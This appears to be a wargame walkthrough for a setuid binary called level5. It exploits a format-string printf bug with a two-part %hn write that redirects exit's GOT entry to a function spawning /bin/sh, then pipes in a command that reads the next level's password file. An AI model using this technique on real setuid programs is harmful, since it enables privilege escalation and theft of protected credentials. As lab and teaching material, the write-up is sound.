level5 - walkthrough
====================

Target: /home/user/level5/level5   (setuid + setgid level6)
Goal:   read /home/user/level6/.pass

1. Recon (objdump -d level5)
     n():   fgets(buf,0x200,stdin); printf(buf); exit(1);   ; format-string vuln
     o():   system("/bin/sh"); _exit(1);                    ; @ 0x080484a4, unused
   There is no "magic value" branch this time. But n() calls exit() right after
   the vulnerable printf, and exit() is resolved lazily through the GOT.

     $ objdump -R level5 | grep exit
       08049838 R_386_JUMP_SLOT   exit        <-- GOT entry to overwrite
   (gdb x/s 0x80485f0 shows o() runs "/bin/sh".)

2. Plan
   Overwrite exit@GOT (0x08049838) with &o (0x080484a4). When n() calls exit(1)
   it will jump into o() instead, giving a shell.

3. Our argument offset
     $ python -c 'print "AAAA" + ".%x"*8' | ./level5
     -> 0x41414141 is the 4th value => our buffer is at position 4.

4. Two-halves write of 0x080484a4 (smaller half first)
       high 0x0804 (  2052) -> got+2 (0x0804983a)
       low  0x84a4 ( 33956) -> got   (0x08049838)
   Buffer front (positions 4,5,6):  [ got+2 ][ "AAAA" ][ got ]
   Format body (unnumbered):
       %8x%8x     consume positions 1,2      (16 chars; running = 12+16 = 28)
       %2024x     consume position 3          -> running = 2052
       %hn        position 4 = got+2          -> write 0x0804
       %31904x    position 5 = "AAAA"          -> running = 33956
       %hn        position 6 = got             -> write 0x84a4
   => exit@GOT = 0x080484a4 = &o.

5. Driving the shell
   o() runs system("/bin/sh"), which reads from stdin. Feed the command after a
   1s pause so fgets() read-ahead does not swallow it:
     ( python -c '...payload...'; sleep 1; echo "cat /home/user/level6/.pass" ) \
       | ./level5

